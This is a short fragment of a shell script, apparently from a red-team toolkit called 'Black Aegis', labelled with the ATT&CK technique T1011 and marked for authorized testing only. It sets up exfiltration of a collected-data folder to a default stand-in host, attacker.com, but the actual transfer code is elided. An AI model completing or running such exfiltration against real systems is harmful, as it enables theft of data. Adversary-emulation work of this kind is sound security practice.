...
# Technique: T1011 - Exfiltration Over Other Network Medium (T1011)
# WARNING: Authorized testing only.

DATA="${1:-/tmp/collected}"
SERVER="${2:-attacker.com}"

echo "[*] Black Aegis - T1011 Exfiltration"
echo "[*] Data: $DATA"
echo "[*] Server: $SERVER"
...
case "T1011" in
    ...
    T1567.001)
        ...
        ;;
    *)
        echo "[+] Exfiltration via Exfiltration Over Other Network Medium (T1011)"
